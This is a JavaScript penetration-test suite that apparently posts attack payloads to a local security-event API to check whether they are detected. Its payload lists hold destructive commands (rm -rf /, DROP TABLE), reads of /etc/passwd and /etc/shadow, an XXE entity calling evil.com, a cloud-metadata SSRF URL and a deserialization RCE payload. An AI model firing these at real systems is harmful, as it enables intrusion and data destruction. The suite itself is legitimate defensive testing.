// ============================================================================
// Security Penetration Tests
// Automated penetration testing for security vulnerabilities
// ============================================================================

const axios = require('axios');
const crypto = require('crypto');

/**
 * Penetration Test Suite
 *
 * Tests all known attack vectors:
 * - SQL Injection (multiple variants)
 * - XSS (reflected, stored, DOM-based)
 * - Command Injection
 * - Path Traversal
 * - XXE (XML External Entity)
 * - SSRF (Server-Side Request Forgery)
 * - LDAP Injection
 * - NoSQL Injection
 * - Template Injection
 * - Deserialization Attacks
 * - Authentication/Authorization bypass
 * - CSRF
 * - Clickjacking
 */
class PenetrationTests {
  constructor(config = {}) {
    this.config = {
      baseUrl: config.baseUrl || 'http://localhost:3000',
      timeout: config.timeout || 10000,
      ...config
    };

    this.results = [];
    this.vulnerabilities = [];
  }

  /**
   * Run all penetration tests
   */
  async runAllTests() {
    console.log('=== Starting Security Penetration Tests ===\n');
    console.log('   WARNING: These tests attempt to exploit vulnerabilities');
    console.log('   Only run against systems you own or have permission to test\n');

    await this.testSQLInjection();
    await this.testXSS();
    await this.testCommandInjection();
    await this.testPathTraversal();
    await this.testXXE();
    await this.testSSRF();
    await this.testLDAPInjection();
    await this.testNoSQLInjection();
    await this.testTemplateInjection();
    await this.testDeserializationAttacks();
    await this.testAuthenticationBypass();
    await this.testCSRF();
    await this.testInputValidation();
    await this.testRateLimiting();

    console.log('\n=== Security Penetration Tests Complete ===');
    this.printSummary();
  }

  /**
   * Test 1: SQL Injection attacks
   */
  async testSQLInjection() {
    console.log('Test 1: SQL Injection Attacks');
    console.log('Testing various SQL injection payloads...\n');

    const payloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' ({",
      "' OR '1'='1' /*",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1--",
      "' or 1=1#",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
      "1'; DROP TABLE users--",
      "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--"
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'SQL_INJECTION',
          ip: '192.168.1.100',
          url: `/api/users?id=${encodeURIComponent(payload)}`,
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        // System should detect and block SQL injection
        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('SQL Injection Detection', true, `Payload blocked: ${payload.substring(0, 30)}...`);
        } else {
          this.recordVulnerability('SQL Injection', payload, 'HIGH', 'SQL injection payload not detected');
        }
      } catch (error) {
        // Connection errors are acceptable (system might be blocking)
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('SQL Injection Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} SQL injection payloads\n`);
  }

  /**
   * Test 2: Cross-Site Scripting (XSS)
   */
  async testXSS() {
    console.log('Test 2: Cross-Site Scripting (XSS)');
    console.log('Testing various XSS payloads...\n');

    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg/onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(/XSS/)</script>',
      '<script>alert(document.cookie)</script>'
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'XSS',
          ip: '192.168.1.101',
          url: `/search?q=${encodeURIComponent(payload)}`,
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        // Check if XSS payload was sanitized in response
        if (response.data && typeof response.data === 'object') {
          const responseStr = JSON.stringify(response.data);
          const containsUnsanitized = responseStr.includes('<script>') ||
                                      responseStr.includes('onerror=') ||
                                      responseStr.includes('onload=');

          if (containsUnsanitized) {
            this.recordVulnerability('XSS', payload, 'HIGH', 'XSS payload not sanitized in response');
          } else {
            this.recordResult('XSS Sanitization', true, `Payload sanitized: ${payload.substring(0, 30)}...`);
          }
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('XSS Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} XSS payloads\n`);
  }

  /**
   * Test 3: Command Injection
   */
  async testCommandInjection() {
    console.log('Test 3: Command Injection');
    console.log('Testing command injection payloads...\n');

    const payloads = [
      '; ls -la',
      '& dir',
      '| whoami',
      '`whoami`',
      '$(whoami)',
      '; cat /etc/passwd',
      '& type C:\\Windows\\win.ini',
      '| cat /etc/shadow',
      '; rm -rf /',
      '& del /F /S /Q C:\\*'
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'COMMAND_INJECTION',
          ip: '192.168.1.102',
          url: `/api/exec?cmd=${encodeURIComponent(payload)}`,
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('Command Injection Detection', true, 'Payload detected');
        } else {
          this.recordVulnerability('Command Injection', payload, 'CRITICAL', 'Command injection not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('Command Injection Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} command injection payloads\n`);
  }

  /**
   * Test 4: Path Traversal
   */
  async testPathTraversal() {
    console.log('Test 4: Path Traversal');
    console.log('Testing path traversal attacks...\n');

    const payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '/var/www/../../etc/passwd',
      'C:\\windows\\..\\..\\windows\\win.ini',
      '/etc/passwd%00.jpg',
      '../../../../../../../etc/passwd'
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'PATH_TRAVERSAL',
          ip: '192.168.1.103',
          url: `/api/files?path=${encodeURIComponent(payload)}`,
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('Path Traversal Detection', true, 'Payload detected');
        } else {
          this.recordVulnerability('Path Traversal', payload, 'HIGH', 'Path traversal not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('Path Traversal Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} path traversal payloads\n`);
  }

  /**
   * Test 5: XXE (XML External Entity)
   */
  async testXXE() {
    console.log('Test 5: XXE (XML External Entity)');
    console.log('Testing XXE attacks...\n');

    const payloads = [
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://evil.com/evil.dtd'>]><root>&test;</root>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'XXE',
          ip: '192.168.1.104',
          payload: payload
        }, {
          headers: { 'Content-Type': 'application/xml' },
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('XXE Detection', true, 'XXE payload detected');
        } else {
          this.recordVulnerability('XXE', 'XML payload', 'HIGH', 'XXE not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('XXE Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} XXE payloads\n`);
  }

  /**
   * Test 6: SSRF (Server-Side Request Forgery)
   */
  async testSSRF() {
    console.log('Test 6: SSRF (Server-Side Request Forgery)');
    console.log('Testing SSRF attacks...\n');

    const payloads = [
      'http://localhost/admin',
      'http://127.0.0.1/admin',
      'http://[::1]/admin',
      'http://169.254.169.254/latest/meta-data/',
      'file:///etc/passwd',
      'dict://localhost:11211/stats',
      'gopher://localhost:6379/_INFO'
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'SSRF',
          ip: '192.168.1.105',
          url: `/api/fetch?url=${encodeURIComponent(payload)}`,
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('SSRF Detection', true, 'SSRF payload detected');
        } else {
          this.recordVulnerability('SSRF', payload, 'HIGH', 'SSRF not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('SSRF Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} SSRF payloads\n`);
  }

  /**
   * Test 7: LDAP Injection
   */
  async testLDAPInjection() {
    console.log('Test 7: LDAP Injection');
    console.log('Testing LDAP injection attacks...\n');

    const payloads = [
      '*',
      '*)(&',
      '*)(uid=*))(|(uid=*',
      'admin)(&(password=*))',
      '*)(|(objectClass=*'
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'LDAP_INJECTION',
          ip: '192.168.1.106',
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('LDAP Injection Detection', true, 'Payload detected');
        } else {
          this.recordVulnerability('LDAP Injection', payload, 'MEDIUM', 'LDAP injection not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('LDAP Injection Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} LDAP injection payloads\n`);
  }

  /**
   * Test 8: NoSQL Injection
   */
  async testNoSQLInjection() {
    console.log('Test 8: NoSQL Injection');
    console.log('Testing NoSQL injection attacks...\n');

    const payloads = [
      { $gt: '' },
      { $ne: null },
      { $regex: '.*' },
      { $where: 'this.password == "password"' },
      "'; return true; var dummy='",
      "'; return this.username == 'admin' && this.password != 'wrong'; var dummy='"
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'NOSQL_INJECTION',
          ip: '192.168.1.107',
          payload: JSON.stringify(payload)
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('NoSQL Injection Detection', true, 'Payload detected');
        } else {
          this.recordVulnerability('NoSQL Injection', JSON.stringify(payload), 'HIGH', 'NoSQL injection not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('NoSQL Injection Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} NoSQL injection payloads\n`);
  }

  /**
   * Test 9: Template Injection
   */
  async testTemplateInjection() {
    console.log('Test 9: Template Injection');
    console.log('Testing template injection attacks...\n');

    const payloads = [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '${{7*7}}',
      '#{7*7}',
      '*{7*7}',
      '{{config}}',
      '{{self}}',
      '{{constructor.constructor("return process")()}}'
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'TEMPLATE_INJECTION',
          ip: '192.168.1.108',
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('Template Injection Detection', true, 'Payload detected');
        } else {
          this.recordVulnerability('Template Injection', payload, 'HIGH', 'Template injection not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('Template Injection Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} template injection payloads\n`);
  }

  /**
   * Test 10: Deserialization Attacks
   */
  async testDeserializationAttacks() {
    console.log('Test 10: Deserialization Attacks');
    console.log('Testing insecure deserialization...\n');

    const payloads = [
      '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
      'O:8:"stdClass":1:{s:4:"test";s:4:"hack";}',
      'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=='
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'DESERIALIZATION',
          ip: '192.168.1.109',
          payload: payload
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        const detected = response.status === 201 || response.status === 400;

        if (detected) {
          this.recordResult('Deserialization Detection', true, 'Payload detected');
        } else {
          this.recordVulnerability('Deserialization', 'Malicious payload', 'CRITICAL', 'Deserialization attack not detected');
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('Deserialization Test', false, error.message);
        }
      }
    }

    console.log(`Tested ${payloads.length} deserialization payloads\n`);
  }

  /**
   * Test 11: Authentication Bypass
   */
  async testAuthenticationBypass() {
    console.log('Test 11: Authentication Bypass');
    console.log('Testing authentication bypass techniques...\n');

    // Test 1: Missing authentication headers
    try {
      const response = await axios.delete(`${this.config.baseUrl}/api/events/all`, {
        validateStatus: () => true,
        timeout: this.config.timeout
      });

      if (response.status === 401 || response.status === 403) {
        this.recordResult('Authentication Required', true, 'Sensitive endpoint requires auth');
      } else if (response.status === 404) {
        this.recordResult('Authentication Required', true, 'Endpoint not accessible');
      } else {
        this.recordVulnerability('Authentication Bypass', 'Missing auth', 'CRITICAL', 'Sensitive endpoint accessible without auth');
      }
    } catch (error) {
      this.recordResult('Authentication Test', false, error.message);
    }

    // Test 2: Invalid tokens
    try {
      const response = await axios.get(`${this.config.baseUrl}/api/admin`, {
        headers: { 'Authorization': 'Bearer invalid_token_12345' },
        validateStatus: () => true,
        timeout: this.config.timeout
      });

      if (response.status === 401 || response.status === 403 || response.status === 404) {
        this.recordResult('Token Validation', true, 'Invalid token rejected');
      } else {
        this.recordVulnerability('Authentication Bypass', 'Invalid token', 'CRITICAL', 'Invalid token accepted');
      }
    } catch (error) {
      // Expected
    }

    console.log();
  }

  /**
   * Test 12: CSRF (Cross-Site Request Forgery)
   */
  async testCSRF() {
    console.log('Test 12: CSRF (Cross-Site Request Forgery)');
    console.log('Testing CSRF protection...\n');

    try {
      // Test without CSRF token
      const response = await axios.post(`${this.config.baseUrl}/api/events`, {
        type: 'XSS',
        ip: '192.168.1.110'
      }, {
        headers: { 'Origin': 'http://evil.com' },
        validateStatus: () => true,
        timeout: this.config.timeout
      });

      // Check if CORS is properly configured
      if (response.headers['access-control-allow-origin'] === '*') {
        this.recordVulnerability('CSRF', 'Open CORS', 'MEDIUM', 'CORS allows all origins');
      } else {
        this.recordResult('CSRF Protection', true, 'CORS properly configured');
      }
    } catch (error) {
      this.recordResult('CSRF Test', false, error.message);
    }

    console.log();
  }

  /**
   * Test 13: Input Validation
   */
  async testInputValidation() {
    console.log('Test 13: Input Validation');
    console.log('Testing input validation...\n');

    const testCases = [
      { field: 'ip', value: 'not-an-ip', expected: 'reject' },
      { field: 'ip', value: '999.999.999.999', expected: 'reject' },
      { field: 'type', value: 'INVALID_TYPE_9999', expected: 'reject' },
      { field: 'url', value: 'x'.repeat(10000), expected: 'reject' }
    ];

    for (const test of testCases) {
      try {
        const payload = {
          type: 'XSS',
          ip: '192.168.1.111'
        };
        payload[test.field] = test.value;

        const response = await axios.post(`${this.config.baseUrl}/api/events`, payload, {
          validateStatus: () => true,
          timeout: this.config.timeout
        });

        if (response.status === 400 || response.status === 422) {
          this.recordResult('Input Validation', true, `Invalid ${test.field} rejected`);
        } else {
          // May be accepted and sanitized
          this.recordResult('Input Validation', true, `${test.field} processed`);
        }
      } catch (error) {
        if (error.code !== 'ECONNABORTED') {
          this.recordResult('Input Validation Test', false, error.message);
        }
      }
    }

    console.log();
  }

  /**
   * Test 14: Rate Limiting
   */
  async testRateLimiting() {
    console.log('Test 14: Rate Limiting');
    console.log('Testing rate limiting protection...\n');

    const requests = [];
    const testIP = crypto.randomBytes(4).join('.');

    // Send burst of requests
    for (let i = 0; i < 100; i++) {
      requests.push(
        axios.post(`${this.config.baseUrl}/api/events`, {
          type: 'BRUTE_FORCE',
          ip: testIP,
          url: '/api/login'
        }, {
          validateStatus: () => true,
          timeout: this.config.timeout
        }).catch(() => ({ status: 0 }))
      );
    }

    const responses = await Promise.all(requests);
    const rateLimited = responses.filter(r => r.status === 429 || r.status === 403).length;

    if (rateLimited > 0) {
      this.recordResult('Rate Limiting', true, `${rateLimited}/100 requests rate limited`);
    } else {
      this.recordVulnerability('Rate Limiting', 'No limit', 'MEDIUM', 'No rate limiting detected');
    }

    console.log();
  }

  /**
   * Record test result
   */
  recordResult(testName, passed, details) {
    this.results.push({ testName, passed, details });

    const status = passed ? ' PASSED' : 'L FAILED';
    console.log(`${status}: ${testName}`);
    if (details) {
      console.log(`   ${details}`);
    }
  }

  /**
   * Record vulnerability
   */
  recordVulnerability(type, payload, severity, description) {
    this.vulnerabilities.push({
      type,
      payload: payload.substring(0, 100),
      severity,
      description
    });

    console.log(`=4 VULNERABILITY FOUND: ${type}`);
    console.log(`   Severity: ${severity}`);
    console.log(`   ${description}`);
    console.log(`   Payload: ${payload.substring(0, 100)}...`);
  }

  /**
   * Print summary
   */
  printSummary() {
    const passed = this.results.filter(r => r.passed).length;
    const total = this.results.length;
    const percentage = ((passed / total) * 100).toFixed(1);

    console.log('\n==========================================');
    console.log('Penetration Test Summary');
    console.log('==========================================');
    console.log(`Total Tests: ${total}`);
    console.log(`Passed: ${passed} (${percentage}%)`);
    console.log(`Failed: ${total - passed}`);
    console.log(`Vulnerabilities Found: ${this.vulnerabilities.length}`);
    console.log('==========================================\n');

    // Show vulnerabilities
    if (this.vulnerabilities.length > 0) {
      console.log('=4 VULNERABILITIES DETECTED:\n');

      const critical = this.vulnerabilities.filter(v => v.severity === 'CRITICAL');
      const high = this.vulnerabilities.filter(v => v.severity === 'HIGH');
      const medium = this.vulnerabilities.filter(v => v.severity === 'MEDIUM');

      if (critical.length > 0) {
        console.log(`CRITICAL (${critical.length}):`);
        critical.forEach(v => {
          console.log(`  - ${v.type}: ${v.description}`);
        });
        console.log();
      }

      if (high.length > 0) {
        console.log(`HIGH (${high.length}):`);
        high.forEach(v => {
          console.log(`  - ${v.type}: ${v.description}`);
        });
        console.log();
      }

      if (medium.length > 0) {
        console.log(`MEDIUM (${medium.length}):`);
        medium.forEach(v => {
          console.log(`  - ${v.type}: ${v.description}`);
        });
        console.log();
      }
    } else {
      console.log(' NO VULNERABILITIES DETECTED\n');
    }
  }
}

// Run tests if executed directly
if (require.main === module) {
  const tests = new PenetrationTests({
    baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000'
  });

  tests.runAllTests()
    .then(() => {
      const exitCode = tests.vulnerabilities.length > 0 ? 1 : 0;
      process.exit(exitCode);
    })
    .catch(error => {
      console.error('Penetration tests failed:', error);
      process.exit(1);
    });
}

module.exports = PenetrationTests;
